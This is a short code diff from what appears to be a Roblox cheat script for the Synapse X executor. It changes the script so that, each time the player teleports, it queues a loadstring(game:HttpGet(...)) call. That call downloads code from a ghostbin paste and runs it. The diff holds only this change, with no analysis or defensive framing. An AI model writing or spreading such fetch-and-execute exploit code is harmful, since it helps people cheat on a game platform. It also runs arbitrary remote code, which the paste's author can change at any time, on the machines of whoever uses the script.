@@ -173,7 +173,12 @@ end)
 end
 
 if syn then
-syn.queue_on_teleport('loadstring(game:HttpGet("https://ghostbin.co/paste/66zd9/raw",true))()')
+print("Loaded Extra Modules for S^X")
+game:GetService("Players").LocalPlayer.OnTeleport:Connect(function(State)
+    if State == Enum.TeleportState.Started then
+        syn.queue_on_teleport('loadstring(game:HttpGet("https://ghostbin.co/paste/66zd9/raw",true))()')
+    end
+end)
 end
 
  game.StarterGui:SetCore("SendNotification", {
